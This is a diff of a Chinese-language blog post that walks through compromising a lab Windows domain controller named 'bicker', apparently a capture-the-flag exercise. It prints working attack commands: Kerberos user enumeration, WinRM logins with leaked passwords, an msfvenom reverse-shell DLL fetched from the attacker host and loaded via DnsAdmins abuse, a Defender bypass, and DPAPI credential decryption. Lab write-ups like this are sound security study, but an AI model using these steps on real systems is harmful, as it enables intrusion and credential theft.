@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_bicker.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
 <title>内部_bicker</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -91,7 +91,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
 <h2>1. 主机发现</h2>
 <p>渗透测试的起点是在目标网络中识别存活主机。我们通过 <code class="notranslate">arp-scan</code> 对本地网段进行扫描，以定位我们的目标。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l      
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -101,14 +101,15 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.254 00:50:56:ff:e4:86       VMware, Inc.
 
 4 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.994 seconds (128.39 hosts/sec). 4 responded</pre></div>
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded
+</code></pre>
 <p>扫描结果明确指向 <code class="notranslate">192.168.205.149</code> 为本次测试的目标主机。</p>
 <h2>2. 端口与服务扫描</h2>
 <p>确定目标 IP 后，使用 Nmap 进行深度探测，以绘制出目标的攻击面。首先进行全端口 TCP 连接扫描，确保不遗漏任何开放的服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 -sT -T4 192.168.205.149 -oA nmapscan/ports 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:37 EDT
-Nmap scan report <span class="pl-k">for</span> bicker.com (192.168.205.149)
+Nmap scan report for bicker.com (192.168.205.149)
 Host is up (0.00048s latency).
 Not shown: 65517 filtered tcp ports (no-response)
 PORT      STATE SERVICE
@@ -133,12 +134,13 @@ PORT      STATE SERVICE
 63682/tcp open  unknown
 MAC Address: 00:0C:29:07:21:7A (VMware)
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 90.01 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 90.01 seconds
+</code></pre>
 <p>在识别出开放端口后，我们针对这些端口进行更详细的服务版本探测和默认脚本扫描，以获取操作系统、域名、主机名等关键信息。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,63661,63662,63682 -sC -sV -T4 192.168.205.149 -oA nmapscan/xiports
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:40 EDT
-Nmap scan report <span class="pl-k">for</span> bicker.com (192.168.205.149)
+Nmap scan report for bicker.com (192.168.205.149)
 Host is up (0.00023s latency).
 
 PORT      STATE SERVICE       VERSION
@@ -147,19 +149,20 @@ PORT      STATE SERVICE       VERSION
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bicker.com0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds<span class="pl-k">?</span>
+445/tcp   open  microsoft-ds?
 ...
-<span class="pl-k">|</span> rdp-ntlm-info: 
-<span class="pl-k">|</span>   Target_Name: BICKER
-<span class="pl-k">|</span>   NetBIOS_Domain_Name: BICKER
-<span class="pl-k">|</span>   NetBIOS_Computer_Name: DC
-<span class="pl-k">|</span>   DNS_Domain_Name: bicker.com
-<span class="pl-k">|</span>   DNS_Computer_Name: dc.bicker.com
+| rdp-ntlm-info: 
+|   Target_Name: BICKER
+|   NetBIOS_Domain_Name: BICKER
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: bicker.com
+|   DNS_Computer_Name: dc.bicker.com
 ...
-<span class="pl-k">|</span> smb2-security-mode: 
-<span class="pl-k">|</span>   3:1:1: 
-<span class="pl-k">|</span>_    Message signing enabled and required
-...</pre></div>
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+...
+</code></pre>
 <p><strong>扫描结果分析与解读：</strong><br>
 综合扫描结果，目标主机的画像变得极为清晰：这是一台主机名为 <code class="notranslate">DC</code> 的 Windows 域控制器，其 DNS 域名为 <code class="notranslate">bicker.com</code>。大量开放的 AD 相关端口（Kerberos, LDAP, SMB）证实了这一点。一个重要的发现是 SMB 签名被强制启用（<code class="notranslate">Message signing enabled and required</code>），这增加了网络层的安全性，可以有效防御 NTLM Relay 等中间人攻击。</p>
 <markdown-accessiblity-table><table role="table">
@@ -214,58 +217,62 @@ PORT      STATE SERVICE       VERSION
 <li>
 <p><strong>DNS SRV 记录查询</strong><br>
 通过 <code class="notranslate">dig</code> 查询 SRV 记录，可以精确地确认提供关键服务的服务器主机名。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dig @192.168.205.149 -t SRV _kerberos._tcp.bicker.com
 ...
-<span class="pl-k">;;</span> ANSWER SECTION:
+;; ANSWER SECTION:
 _kerberos._tcp.bicker.com. 600  IN      SRV     0 100 88 dc.bicker.com.
-...</pre></div>
+...
+</code></pre>
 <p>查询结果进一步证实了 Kerberos (KDC), LDAP, 和全局编录 (GC) 服务均由 <code class="notranslate">dc.bicker.com</code> (<code class="notranslate">192.168.205.149</code>) 提供。</p>
 </li>
 <li>
 <p><strong>LDAP 匿名绑定探测</strong><br>
 尝试在未提供任何凭据的情况下查询 LDAP，探测是否存在允许匿名枚举的常见配置错误。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ldapsearch -x -H ldap://192.168.205.149 -b <span class="pl-s"><span class="pl-pds">"</span>DC=bicker,DC=com<span class="pl-pds">"</span></span>
-<span class="pl-c"><span class="pl-c">#</span> extended LDIF</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ldapsearch -x -H ldap://192.168.205.149 -b "DC=bicker,DC=com"
+# extended LDIF
 ...
-<span class="pl-c"><span class="pl-c">#</span> search result</span>
+# search result
 search: 2
 result: 1 Operations error
 text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
- tion a successful <span class="pl-c1">bind</span> must be completed on the connection., data 0, v4f7c
+ tion a successful bind must be completed on the connection., data 0, v4f7c
 
-<span class="pl-c"><span class="pl-c">#</span> numResponses: 1</span></pre></div>
+# numResponses: 1
+</code></pre>
 <p>服务器拒绝了匿名查询，表明其 LDAP 服务进行了基本的安全加固。</p>
 </li>
 <li>
 <p><strong>Kerberos 用户名枚举</strong><br>
 利用 Kerberos 协议在处理用户存在与否时返回不同错误代码的特性，可以使用 <code class="notranslate">kerbrute</code> 等工具高效地验证用户名列表。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ kerbrute userenum --dc 192.168.205.149 -d bicker.com /usr/share/seclists/Usernames/cirt-default-usernames.txt 
 ...
-2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com
-2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       Administrator@bicker.com
-2025/08/16 09:46:41 <span class="pl-k">&gt;</span>  [+] VALID USERNAME:       Guest@bicker.com
-...</pre></div>
+2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com
+2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Administrator@bicker.com
+2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Guest@bicker.com
+...
+</code></pre>
 <p>该步骤成功验证了 <code class="notranslate">administrator</code>, <code class="notranslate">guest</code> 等多个内置账户的存在，为后续的凭据攻击提供了目标。</p>
 </li>
 <li>
 <p><strong>AS-REP Roasting 攻击尝试</strong><br>
 这是一种针对禁用了 Kerberos 预身份验证的用户的攻击。如果存在此类用户，攻击者可以为其请求 TGT，并离线爆破其中包含的加密数据以获取用户密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile <span class="pl-c1">hash</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile hash
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[-] User administrator doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
-<span class="pl-s">[-] User guest doesn<span class="pl-pds">'</span></span>t have UF_DONT_REQUIRE_PREAUTH <span class="pl-c1">set</span></pre></div>
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
 <p>尝试失败，表明目标域中的用户均开启了预身份验证，此攻击路径无效。</p>
 </li>
 </ul>
 <h1><strong>二、初步突破</strong></h1>
 <h2>1. SMB 匿名共享探测</h2>
 <p>尽管 LDAP 匿名绑定被禁用，但 SMB 服务可能存在独立的访问控制配置。我们检查是否存在无需凭据即可访问的共享。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ smbclient -L //192.168.205.149 -N   
 
         Sharename       Type      Comment
@@ -276,64 +283,69 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
         NETLOGON        Disk      Logon server share 
         puppy           Disk      
         SYSVOL          Disk      Logon server share 
-...</pre></div>
+...
+</code></pre>
 <p>发现了一个名为 <code class="notranslate">puppy</code> 的匿名可读共享，这是一个潜在的信息泄露点。我们连接该共享并下载其中的文件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ smbclient //192.168.205.149/puppy -N
-Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
-smb: <span class="pl-cce">\&gt;</span> ls
-  <span class="pl-c1">.</span>                                   D        0  Fri Aug 15 00:06:51 2025
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Aug 15 00:06:51 2025
   ..                                DHS        0  Fri Aug 15 05:20:46 2025
   puppy.jpg                           A    57634  Fri Aug 15 00:06:51 2025
 
                 12923135 blocks of size 4096. 9313382 blocks available
-smb: <span class="pl-cce">\&gt;</span> get puppy.jpg
-getting file <span class="pl-cce">\p</span>uppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)
-smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span></pre></div>
+smb: \&gt; get puppy.jpg
+getting file \puppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
 <h2>2. 开源情报 (OSINT) 获取凭据</h2>
 <p>对下载的 <code class="notranslate">puppy.jpg</code> 文件进行分析，寻找可能存在的线索。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ strings puppy.jpg<span class="pl-k">|</span>head -n 10        
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ strings puppy.jpg|head -n 10        
 JFIF
 Exif
 bilibili
 Google
 uid=3546958956333518
 0220
- , <span class="pl-c"><span class="pl-c">#</span>&amp;')*)</span>
-<span class="pl-en">-0-(0%</span>()(
-<span class="pl-s"><span class="pl-pds">((</span>((((((((((((((((((((((((((((((((((((((((((((((((</span>
-<span class="pl-s">a<span class="pl-c1">2#q</span></span></pre></div>
+ , #&amp;')*)
+-0-(0%()(
+((((((((((((((((((((((((((((((((((((((((((((((((((
+a2#q
+</code></pre>
 <p>文件字符串中包含一个 Bilibili UID (<code class="notranslate">3546958956333518</code>)。通过在 Bilibili 网站上搜索此 UID，我们找到了一个用户发布的动态，其中直接泄露了一组凭据：<br>
 <strong><code class="notranslate">tindalos:Th3C@ll0fCtHu1hu!</code></strong></p>
 <h2>3. 获得初始 Shell</h2>
 <p>利用这组意外获得的凭据，我们尝试通过之前发现的 WinRM 服务 (端口 5985) 登录目标主机。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>tindalos<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>Th3C@ll0fCtHu1hu!<span class="pl-pds">'</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ evil-winrm -i 192.168.205.149 -u 'tindalos' -p 'Th3C@ll0fCtHu1hu!'
                                         
 Evil-WinRM shell v3.7
 ...                                     
 Info: Establishing connection to remote endpoint
-<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\t</span>indalos<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span></pre></div>
+*Evil-WinRM* PS C:\Users\tindalos\Documents&gt;
+</code></pre>
 <p>连接成功！我们获得了一个属于域用户 <code class="notranslate">bicker\tindalos</code> 的交互式 PowerShell Shell，完成了初步突破。</p>
 <h1><strong>三、权限提升</strong></h1>
 <h2>1. 内部信息收集与态势感知</h2>
 <p>立足于当前 Shell，首要任务是全面了解 <code class="notranslate">tindalos</code> 用户的权限和在域中的角色。</p>
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> whoami <span class="pl-k">/</span>all
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; whoami /all
 
 用户信息
-<span class="pl-k">----------------</span>
+----------------
 用户名          SID
-<span class="pl-k">===============</span> <span class="pl-k">============================================</span>
-bicker\tindalos S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1103</span>
+=============== ============================================
+bicker\tindalos S-1-5-21-298176814-2846777796-698167141-1103
 
 组信息
-<span class="pl-k">-----------------</span>
+-----------------
 组名                                        类型   SID                                          属性
-<span class="pl-k">===========================================</span> <span class="pl-k">======</span> <span class="pl-k">============================================</span> <span class="pl-k">======================================</span>
+=========================================== ====== ============================================ ======================================
 ...
-BICKER\DnsAdmins                            别名   S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1101</span> 必需的组<span class="pl-k">,</span> 启用于默认<span class="pl-k">,</span> 启用于组<span class="pl-k">,</span> 本地组
-...</pre></div>
+BICKER\DnsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用于组, 本地组
+...
+</code></pre>
 <p><strong>关键发现：</strong> <code class="notranslate">whoami /all</code> 的输出显示，用户 <code class="notranslate">tindalos</code> 隶属于 <code class="notranslate">DnsAdmins</code> 组。这是一个极度危险的内置组，其成员通常可以通过滥用 DNS 服务配置来实现权限提升至域控的 <code class="notranslate">SYSTEM</code>。</p>
 <h2>2. 提权路径分析：两条道路</h2>
 <p>基于 <code class="notranslate">DnsAdmins</code> 的权限，我们有两条提权路径可选：</p>
@@ -347,37 +359,40 @@ BICKER\DnsAdmins                            别名   S<span class="pl-k">-</span
 <li>
 <p><strong>生成恶意 DLL</strong><br>
 使用 <code class="notranslate">msfvenom</code> 创建一个反向连接 Shell 的 DLL。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f dll -o dns.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of dll file: 9216 bytes
-Saved as: dns.dll</pre></div>
+Saved as: dns.dll
+</code></pre>
 </li>
 <li>
 <p><strong>上传并配置 DLL</strong><br>
 在 <code class="notranslate">tindalos</code> 的 Shell 中，从 Kali 下载此 DLL，并使用 <code class="notranslate">dnscmd.exe</code> 将其注册为 <code class="notranslate">ServerLevelPluginDll</code>。</p>
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/dns.dll<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\Users\tindalos\Documents\dns.dll<span class="pl-pds">"</span></span>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; Invoke-WebRequest -Uri "http://192.168.205.128/dns.dll" -OutFile "C:\Users\tindalos\Documents\dns.dll"
 
-<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">dnscmd.exe</span> localhost <span class="pl-k">/</span>config <span class="pl-k">/</span>serverlevelplugindll C:\Users\tindalos\Documents\dns.dll
+*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; dnscmd.exe localhost /config /serverlevelplugindll C:\Users\tindalos\Documents\dns.dll
 
 注册属性 serverlevelplugindll 成功重置。
-命令成功完成。</pre></div>
+命令成功完成。
+</code></pre>
 </li>
 <li>
 <p><strong>监听并（模拟）重启</strong><br>
 在 Kali 上开启监听。此时，通过虚拟化管理平台重启目标服务器，即可触发 DLL 加载。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888                                                 
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 62282
 Microsoft Windows [�汾 10.0.20348.169]
 (c) Microsoft Corporation����������Ȩ����
 
-C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span>whoami
-nt authority<span class="pl-cce">\s</span>ystem</pre></div>
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
 <p>此路径虽然可行，但绕过了靶机设计的核心挑战。</p>
 </li>
 </ul>
@@ -387,66 +402,73 @@ nt authority<span class="pl-cce">\s</span>ystem</pre></div>
 <ul>
 <li><strong>枚举域用户</strong><br>
 为规划横向移动路径，我们枚举域内的其他用户及其组关系。
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> net user jianyin <span class="pl-k">/</span>domain
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user jianyin /domain
 ...
-全局组成员             <span class="pl-k">*</span>Domain Users         <span class="pl-k">*</span>DNSRestarters
-<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\tindalos\Documents<span class="pl-k">&gt;</span> net user lihua <span class="pl-k">/</span>domain
+全局组成员             *Domain Users         *DNSRestarters
+*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user lihua /domain
 ...
-全局组成员             <span class="pl-k">*</span>Domain Users         <span class="pl-k">*</span>AccountModifier</pre></div>
+全局组成员             *Domain Users         *AccountModifier
+</code></pre>
 发现了两个关键的自定义组：<code class="notranslate">DNSRestarters</code> 和 <code class="notranslate">AccountModifier</code>。</li>
 <li><strong>绕过 Windows Defender</strong><br>
 尝试执行<code class="notranslate">Seatbelt.exe</code>被 Defender 拦截。通过探索发现 <code class="notranslate">C:\wirteTEMP</code> 是一个白名单目录，后续工具均在此目录下执行。</li>
 <li><strong>利用 DPAPI 解密凭据</strong><br>
 <strong>技术背景</strong>：Windows 使用数据保护 API (DPAPI) 来加密存储在用户配置文件中的敏感信息。由于我们已知 <code class="notranslate">tindalos</code> 的明文密码，可以解密其 DPAPI 主密钥，进而解密由它保护的其他凭据。
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/SharpDPAPI.exe<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\wirteTEMP\SharpDPAPI.exe<span class="pl-pds">"</span></span>
-<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> .<span class="pl-k">/</span><span class="pl-c1">SharpDPAPI.exe</span> credentials <span class="pl-k">/</span>unprotect <span class="pl-k">/</span>credfile:<span class="pl-s"><span class="pl-pds">"</span>C:\Users\tindalos\AppData\Roaming\Microsoft\Credentials\A2E4656BCBABFD9279E090E8482A7141<span class="pl-pds">"</span></span> <span class="pl-k">/</span>sid:S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">1103</span> <span class="pl-k">/</span>password:<span class="pl-s"><span class="pl-pds">"</span>Th3C@ll0fCtHu1hu!<span class="pl-pds">"</span></span>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri "http://192.168.205.128/SharpDPAPI.exe" -OutFile "C:\wirteTEMP\SharpDPAPI.exe"
+*Evil-WinRM* PS C:\wirteTEMP&gt; ./SharpDPAPI.exe credentials /unprotect /credfile:"C:\Users\tindalos\AppData\Roaming\Microsoft\Credentials\A2E4656BCBABFD9279E090E8482A7141" /sid:S-1-5-21-298176814-2846777796-698167141-1103 /password:"Th3C@ll0fCtHu1hu!"
 ...
   CredFile           : A2E4656BCBABFD9279E090E8482A7141
     ...
     UserName         : lihua
-    Credential       : hello<span class="pl-k">%</span><span class="pl-c1">2633</span>
-...</pre></div>
+    Credential       : hello%2633
+...
+</code></pre>
 执行成功！我们从 <code class="notranslate">tindalos</code> 的本地存储中，解密出了另一位用户 <code class="notranslate">lihua</code> 的明文密码：<code class="notranslate">hello%2633</code>。</li>
 </ul>
 <h3>4.2. 横向移动与 ACL 深度枚举</h3>
 <p>获得了 <code class="notranslate">lihua</code> 的凭据，我们立即横向移动到该用户的会话中，并深入挖掘其所属的 <code class="notranslate">AccountModifier</code> 组到底拥有何种权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>lihua<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>hello%2633<span class="pl-pds">'</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ evil-winrm -i 192.168.205.149 -u 'lihua' -p 'hello%2633'
 ...
-<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\l</span>ihua<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span> whoami
-bicker<span class="pl-cce">\l</span>ihua</pre></div>
+*Evil-WinRM* PS C:\Users\lihua\Documents&gt; whoami
+bicker\lihua
+</code></pre>
 <p>为了精确枚举 Active Directory 的访问控制列表 (ACL)，我们上传并加载强大的 <code class="notranslate">PowerView.ps1</code> 脚本。</p>
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Invoke-WebRequest</span> <span class="pl-k">-</span>Uri <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.128/PowerView.ps1<span class="pl-pds">"</span></span> <span class="pl-k">-</span>OutFile <span class="pl-s"><span class="pl-pds">"</span>C:\wirteTEMP\pv.ps1<span class="pl-pds">"</span></span>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri "http://192.168.205.128/PowerView.ps1" -OutFile "C:\wirteTEMP\pv.ps1"
 
-<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-k">.</span> .\pv.ps1</pre></div>
+*Evil-WinRM* PS C:\wirteTEMP&gt; . .\pv.ps1
+</code></pre>
 <p>加载后，我们使用 PowerView 查询 <code class="notranslate">AccountModifier</code> 组具体对 <code class="notranslate">jianyin</code> 用户拥有哪些权限。</p>
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Find-InterestingDomainAcl</span> <span class="pl-k">-</span>ResolveGUIDs <span class="pl-k">|</span> <span class="pl-c1">Where-Object</span> { <span class="pl-c1">$_<span class="pl-smi">.ObjectDN</span></span> <span class="pl-k">-match</span> <span class="pl-s"><span class="pl-pds">"</span>jianyin<span class="pl-pds">"</span></span> } <span class="pl-k">|</span> <span class="pl-c1">Format-List</span> <span class="pl-k">*</span>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\wirteTEMP&gt; Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ObjectDN -match "jianyin" } | Format-List *
 
-ObjectDN                : CN<span class="pl-k">=</span>jianyin<span class="pl-k">,</span>CN<span class="pl-k">=</span>Users<span class="pl-k">,</span>DC<span class="pl-k">=</span>bicker<span class="pl-k">,</span>DC<span class="pl-k">=</span>com
+ObjectDN                : CN=jianyin,CN=Users,DC=bicker,DC=com
 AceQualifier            : AccessAllowed
 ActiveDirectoryRights   : ExtendedRight
-ObjectAceType           : User<span class="pl-k">-</span>Force<span class="pl-k">-</span>Change<span class="pl-k">-</span>Password
+ObjectAceType           : User-Force-Change-Password
 AceFlags                : None
 AceType                 : AccessAllowedObject
 InheritanceFlags        : None
